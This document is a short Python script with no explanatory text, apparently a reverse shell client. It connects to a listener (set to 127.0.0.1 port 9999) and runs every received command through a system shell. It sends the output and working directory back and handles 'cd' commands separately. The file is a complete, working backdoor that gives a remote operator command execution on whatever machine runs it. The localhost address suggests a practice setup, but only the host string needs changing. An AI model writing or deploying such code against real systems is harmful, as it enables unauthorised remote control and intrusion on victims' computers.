#in the name of Allah, the Gracious, the Merciful
from socket import *
import os
import subprocess

s = socket()
host = "127.0.0.1"
port = 9999
s.connect((host, port))
cd = os.getcwd() + "$ "
s.send(cd.encode("utf-8"))
while True:
	msg = s.recv(2048)
	if msg[:2].decode("utf-8") == 'cd':
		try:
			os.chdir(msg[3:].decode("utf-8"))
		except Exception as e:
			print("error")	
		cd = os.getcwd() + "$"
		s.send(cd.encode("utf-8"))
		continue

	if len(msg) > 0:
		cmd = subprocess.Popen(msg[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
		output = cmd.stdout.read() + cmd.stderr.read()
		out_str = str(output, "utf-8") + "\n"+os.getcwd() + "$ "
		s.send(out_str.encode("utf-8"))